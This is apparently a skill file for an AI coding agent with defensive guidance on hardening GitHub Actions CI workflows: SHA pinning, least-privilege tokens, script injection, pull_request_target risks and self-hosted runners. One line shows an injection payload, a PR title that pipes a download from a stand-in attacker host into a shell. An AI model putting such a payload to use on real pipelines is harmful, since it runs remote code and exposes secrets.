---
name: ci-actions
description: Writes and hardens CI workflows — GitHub Actions in particular — with pinned dependencies, least-privilege tokens, and the untrusted-input traps that turn a build into a credential leak. Use when adding or changing a workflow, a build/test/release pipeline, or a reusable action, and when a CI run needs secrets. For reviewing a workflow diff for vulnerabilities, sde-agents:code-reviewer carries the review-side checklist; for applying anything to the live lab, use sde-agents:homelab-platform.
argument-hint: [the workflow or pipeline to build or harden]
---

# CI workflows

CI is the most privileged automation most projects run: it holds the deploy credentials, runs on
every push, and executes code from anyone who can open a pull request. Write it as a security
boundary that also happens to run tests.

## The four rules that prevent the real incidents

1. **Pin every third-party action to a full commit SHA**, with the version in a trailing comment:
   `uses: actions/checkout@<40-char-sha> # v4.2.2`. A tag is mutable — the `tj-actions/changed-files`
   compromise (March 2025) worked by retagging existing versions, so every workflow tracking a tag
   pulled the attacker's code and leaked its secrets into build logs. A SHA cannot be moved.
   Re-pin deliberately (Dependabot can propose SHA bumps), read the diff when you do, and give
   routine re-pins a cooldown — adopt a release only after it has been public a few days, because
   compromise campaigns count on fast adoption before detection catches the malicious version. A
   fix for a disclosed vulnerability in the SHA you are on skips the cooldown: waiting there keeps
   you on the known-bad version. Read the diff and the provenance, then re-pin immediately.
2. **`permissions:` least-privilege, declared explicitly.** Default to `contents: read` at the
   workflow level and widen per job only where needed (`pull-requests: write` for a commenting job,
   `id-token: write` only for OIDC). An undeclared block inherits the repository default, which is
   often write-all — a token that can push to your default branch, in a job that only runs tests.
3. **Never interpolate event data into a shell.** `run: echo "${{ github.event.pull_request.title }}"`
   is script injection: a PR titled `$(curl attacker.example|sh)` executes in your runner. Pass it
   through `env:` and reference `"$TITLE"` quoted — the shell then treats it as data, which it is.
   The same applies to branch names, commit messages, issue bodies, and review comments.
4. **`pull_request_target` and `workflow_run` are the pwn-request class.** Both run with repository
   secrets and write permissions **in the context of the base repo**, and they exist so a workflow
   can act on a fork's PR. If such a workflow checks out the fork's code and then builds, tests, or
   runs anything from it, you have handed a stranger your secrets. If you must use it: check out only
   the base repo (never `ref: ${{ github.event.pull_request.head.sha }}` followed by execution), do
   no build steps, and keep the job to labelling or commenting. Untrusted PR code belongs in a plain
   `pull_request` job, which has no secrets.

## Everything else worth doing, briefly

- **Concurrency**: cancel superseded runs (`concurrency: { group: ${{ github.workflow }}-${{ github.ref }}, cancel-in-progress: true }`) so a busy branch doesn't queue ten builds.
- **Timeouts on every job** (`timeout-minutes:`) — a hung job holds a runner until the platform's
  6-hour cap.
- **Cache the dependency store, not the build output**, and key it on the lockfile hash. A cache key
  that ignores the lockfile serves stale dependencies, which is a debugging nightmare that looks like
  flakiness. Never cache anything derived from untrusted PR code into a shared key.
- **Pin the runner image** (`ubuntu-24.04`, not `ubuntu-latest`) when reproducibility matters —
  `latest` moves and breaks builds on the platform's schedule, not yours.
- **Secrets are per-job and never echoed.** Don't pass a secret as a command-line argument (it shows
  in process listings); use `env:` or stdin. Prefer OIDC (`id-token: write` + a cloud trust policy)
  over long-lived stored credentials.
- **Fork PRs don't get secrets, by design** — a workflow that requires a secret to pass will always
  fail on fork contributions. Split it: the required checks run without secrets, the secret-needing
  job runs post-merge or on a label.
- **Lint the workflows**: `actionlint` for correctness (it catches expression and shell errors CI
  would otherwise find at runtime) and `zizmor` for these security patterns. Run them locally when
  you edit a workflow; promote them to CI jobs once workflows change often enough that finding the
  error at runtime costs more than the jobs do. `assets/ci.reusable.yml` pre-wires them for that
  case — CI checking the CI is worth a job when someone else's edit can break it, not on a
  repository where the only author already ran the linter.
- **Release integrity, once the artifact leaves the lab**: build provenance/attestation and an SBOM,
  generated in the release job, so a consumer can verify what they got. The payoff is a consumer who
  cannot just ask you — a public image, a published package, a release a stranger pulls. For an
  image only your own hosts pull, the build is the answer only when deployment pins the built
  digest — a mutable tag through a registry is a boundary where different bytes can come back, so
  pin the digest or keep the attestation.
- Fail the build on the checks you care about; a workflow with `continue-on-error` everywhere is a
  status badge, not a gate.

## Self-hosted runners

A self-hosted runner executing untrusted PR code is remote code execution on your own hardware,
persisting between jobs. So: **never run fork PRs on a self-hosted runner** (restrict it to trusted
branches and post-merge jobs), make it **ephemeral** (`--ephemeral`, one job then re-register, or a
container/VM per job) so nothing survives to the next job, give it no standing credentials beyond the
job's, and put it on a segmented network — a lab runner that can reach every host is a lateral-movement
path. Standing up a runner in the home lab is an apply under `sde-agents:homelab-platform`'s change
tiers, including the network placement.

## Starting a workflow

Copy [`assets/ci.reusable.yml`](assets/ci.reusable.yml) — it carries the pins, permissions,
concurrency, timeouts, and the env-not-interpolation pattern already wired. Read its header before
using it: the refs are deliberate placeholders you must resolve, and **there are two kinds**. A
GitHub Action pins to a git commit SHA (`actions/checkout@<40-hex>`); a `docker://` step pins to an
image manifest **digest** (`docker://image@sha256:…`), because the ref after `@` is resolved by the
registry, not by git. Putting a commit SHA on a `docker://` line yields an image reference that
does not exist, and the job fails to start.

## Verify

A workflow is unverified until it has **run**. Push the branch and read the run: the job you expected
executed, the check you added actually fails when the code is wrong (break something on purpose
once), and `actionlint` is clean. Paste the run URL or the failing-then-passing evidence. A workflow
that has only ever been read is a plausible YAML file.
